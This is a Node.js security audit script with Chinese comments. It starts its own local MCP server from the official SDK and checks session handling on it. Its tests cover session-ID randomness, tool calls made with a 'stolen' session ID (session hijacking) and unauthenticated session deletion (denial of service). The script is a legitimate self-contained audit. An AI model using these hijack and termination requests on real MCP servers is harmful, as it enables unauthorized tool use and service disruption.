// 一锤子审计脚本：自起靶机 → 合法初始化 → 四命题实测 → 输出裁决
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
import { z } from "zod";
import express from "express";
import { randomUUID } from "node:crypto";

const app = express(); app.use(express.json());
const transports = {};
app.post("/mcp", async (req, res) => {
  console.log(`REQ:${req.body?.method} sid=${(req.headers["mcp-session-id"]||"-").slice(0,8)} known=${!!transports[req.headers["mcp-session-id"]]}`);
  const sessionId = req.headers["mcp-session-id"];
  let transport;
  if (sessionId && transports[sessionId]) transport = transports[sessionId];
  else if (!sessionId && req.body?.method === "initialize") {
    transport = new StreamableHTTPServerTransport({
      sessionIdGenerator: () => randomUUID(), onerror: (e) => console.log("T-ERR:" + (e.message || e)),
      onsessioninitialized: (sid) => { console.log("SESSION-INIT:" + sid.slice(0,8)); transports[sid] = transport; },
    });
    await server.connect(transport);
  } else { res.status(400).json({jsonrpc:"2.0",error:{code:-32000,message:"no valid session"}}); return; }
  try { await transport.handleRequest(req, res, req.body); } catch (e) { console.log("HANDLE-ERR:" + e.message); }
  return;
});
app.delete("/mcp", async (req,res)=>{ const t=transports[req.headers["mcp-session-id"]]; if(!t){res.status(404).end();return;} await t.handleRequest(req,res,req.body); });

const server = new McpServer({ name: "audit-target-1", version: "1.0.0" });
server.tool("sign_receipt", { payload: z.string() }, async ({ payload }) => { console.log(`TOOL-EXECUTED:${payload}`); return { content: [{ type: "text", text: `receipt-of:${payload}` }] }; });
let serverLog = "";
const origLog = console.log;
console.log = (...a) => { serverLog += a.join(" ") + " | "; origLog(...a); };
const srv = app.listen(0, run);
const port = srv.address().port;
const URL = `http://127.0.0.1:${port}/mcp`;

async function call(headers, body) {
  return fetch(URL, { method: "POST", headers: { "Content-Type": "application/json", "Accept": "application/json, text/event-stream", ...headers }, body: JSON.stringify(body), signal: AbortSignal.timeout(9000) });
}
async function readBody(r) {
  const ct = r.headers.get("content-type") || "";
  if (ct.includes("event-stream")) {
    const reader = r.body.getReader();
    let buf = "";
    try {
      const t = setTimeout(() => reader.cancel(), 3000);
      while (buf.length < 4096) {
        const { done, value } = await reader.read();
        if (done) break;
        buf += new TextDecoder().decode(value);
        if (buf.includes("receipt-of:") || buf.includes("result")) break; // 证据串或响应已到
      }
      clearTimeout(t);
    } catch (e) { /* 有界截断 */ }
    return buf;
  }
  return r.text();
}
async function run() {
  const R = [];
  // P0: 合法初始化
  const r0 = await call({}, { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "legit-client", version: "1.0" } } });
  const sid0 = r0.headers.get("mcp-session-id");
  R.push(["P0 合法初始化", r0.status === 200 && !!sid0, `status=${r0.status} sid=${sid0?.slice(0,8)}… len=${sid0?.length}`]);
  await call({ "mcp-session-id": sid0 }, { jsonrpc: "2.0", method: "notifications/initialized" });

  // P1: 会话ID熵（预测性）
  const r1 = await call({}, { jsonrpc: "2.0", id: 2, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "c2", version: "1.0" } } });
  const sid1 = r1.headers.get("mcp-session-id");
  R.push(["P1 会话ID密码学安全(randomUUID)", sid0 !== sid1 && /^[0-9a-f-]{36}$/.test(sid0), `两会话不同: ${sid0 !== sid1} 格式UUID: ${/^[0-9a-f-]{36}$/.test(sid0)}`]);

  // P2: 会话劫持——另一"客户端"持被盗 sid 直接调工具（无第二因子）
  const r2 = await call({ "mcp-session-id": sid0 }, { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "sign_receipt", arguments: { payload: "ATTACKER-FROM-STOLEN-SID" } } });
  const body2 = await readBody(r2);
  const hijacked = body2.includes("ATTACKER") || serverLog.includes("TOOL-EXECUTED:ATTACKER");
  R.push(["P2 会话ID劫持(跨客户端无凭证)", r2.status === 200 && hijacked, `status=${r2.status} ct=${r2.headers.get("content-type")} body=${body2.slice(0,120)} serverLog=${serverLog}`]);

  // P3: 会话终止无重鉴权——任何持 sid 者可 DELETE 杀死受害者会话
  const r3 = await fetch(URL, { method: "DELETE", headers: { "mcp-session-id": sid0 }, signal: AbortSignal.timeout(5000) });
  R.push(["P3 未鉴权会话终止(拒绝服务)", r3.status === 200, `DELETE status=${r3.status}`]);
  const r3b = await call({ "mcp-session-id": sid0 }, { jsonrpc: "2.0", id: 4, method: "tools/list" });
  R.push(["P3b 被杀会话后续请求被拒", r3b.status === 404 || r3b.status === 400, `status=${r3b.status}`]);

  console.log("=== MCP Session Audit · 靶机#1 官方SDK参考实现 (spec 2025-06-18 StreamableHTTP) ===");
  for (const [n, ok, ev] of R) console.log(`${ok ? "!!成立" : "OK不成立"} | ${n} | ${ev}`);
  srv.close(); process.exit(0);
}
